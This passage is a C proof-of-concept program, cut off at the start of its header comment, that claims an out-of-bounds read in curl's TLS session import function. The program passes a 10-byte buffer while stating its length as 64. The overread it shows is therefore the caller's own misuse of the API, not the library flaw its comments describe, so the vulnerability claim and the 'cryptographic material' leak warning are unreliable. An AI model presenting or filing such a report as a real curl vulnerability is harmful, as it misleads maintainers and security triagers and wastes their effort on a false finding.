/*
 * via undersized shmac buffer with claimed shmac_len=64.
 *
 * Affected: curl lib/vtls/vtls_scache.c:Curl_ssl_session_import (lines 1109-1117)
 *           curl lib/vtls/vtls_scache.c:cf_ssl_scache_peer_init (lines 457-460)
 *
 * Root cause:
 *   When ssl_peer_key=NULL, Curl_ssl_session_import validates shmac_len == 64,
 *   but does NOT verify the shmac buffer is actually 64 bytes long.
 *   The code then does:
 *     const unsigned char *salt = shmac;
 *     const unsigned char *hmac = shmac + sizeof(peer->key_salt);  // shmac + 32
 *   And passes salt (32 bytes) and hmac (32 bytes) to cf_ssl_scache_peer_init
 *   which calls memcpy(peer->key_salt, salt, sizeof(peer->key_salt)) (32 bytes)
 *   and memcpy(peer->key_hmac, hmac, sizeof(peer->key_hmac)) (32 bytes).
 *   If shmac points to a 10-byte buffer, both memcpy calls read out-of-bounds.
 *
 * Crash: ASAN reports stack-buffer-overflow READ of size 32 at
 *        vtls_scache.c:458 in cf_ssl_scache_peer_init.
 *
 * Exploitation: OOB read - can leak adjacent stack memory (salt/hmac from surrounding data),
 * potentially leaking sensitive cryptographic material.
 *
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <curl/curl.h>

int main(void)
{
    CURL *curl;
    CURLcode res;
    CURLM *multi;

    /*
     * Valid packed session data (minimal):
     *   VERSION(0x01) TICKET(0x04) len(0x0004) data(4 bytes)
     *   IETF_ID(0x02) tls13(0x0304)
     *   VALID_UNTIL(0x03) far_future(8 bytes)
     */
    unsigned char sdata[] = {
        0x01,               /* CURL_SPACK_VERSION */
        0x04,               /* CURL_SPACK_TICKET */
        0x00, 0x04,         /* ticket length = 4 bytes */
        0xDE, 0xAD, 0xBE, 0xEF,
        0x02,               /* CURL_SPACK_IETF_ID */
        0x03, 0x04,         /* TLS 1.3 */
        0x03,               /* CURL_SPACK_VALID_UNTIL */
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    };

    /*
     * THE BUG: Only 10 bytes allocated, but we claim shmac_len=64.
     * shmac_len validation passes (== 64 == sizeof(salt)+sizeof(hmac)),
     * but actual buffer only has 10 bytes.
     * Code will read: salt = shmac[0..31] and hmac = shmac[32..63]
     * Both accesses go past the 10-byte buffer boundary.
     */
    unsigned char small_shmac[10];
    memset(small_shmac, 0xAA, sizeof(small_shmac));

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if(!curl) {
        fprintf(stderr, "curl_easy_init() failed\n");
        return 1;
    }

    multi = curl_multi_init();
    if(!multi) {
        fprintf(stderr, "curl_multi_init() failed\n");
        curl_easy_cleanup(curl);
        return 1;
    }
    curl_multi_add_handle(multi, curl);

    fprintf(stderr, "[*] shmac buffer size = 10 bytes\n");
    fprintf(stderr, "[*] claimed shmac_len = 64 (passes validation check)\n");
    fprintf(stderr, "[*] Code will memcpy 32+32=64 bytes from 10-byte buffer -> OOB read\n");

    /*
     * ssl_peer_key=NULL forces the HMAC path:
     *   - shmac_len check: 64 == sizeof(key_salt) + sizeof(key_hmac) -> passes
     *   - salt = shmac (points into 10-byte buffer)
     *   - hmac = shmac + 32 (22 bytes past end of 10-byte buffer!)
     *   - cf_ssl_scache_peer_init: memcpy(peer->key_salt, salt, 32) -> OOB read
     *   - cf_ssl_scache_peer_init: memcpy(peer->key_hmac, hmac, 32) -> OOB read
     */
    res = curl_easy_ssls_import(
        curl,
        NULL,               /* ssl_peer_key=NULL -> use HMAC path */
        small_shmac, 64,    /* shmac=10-byte buffer but claim 64 bytes -> OOB! */
        sdata, sizeof(sdata)
    );

    fprintf(stderr, "[*] Result: %d (%s)\n", res, curl_easy_strerror(res));

    curl_multi_remove_handle(multi, curl);
    curl_multi_cleanup(multi);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return 0;
}
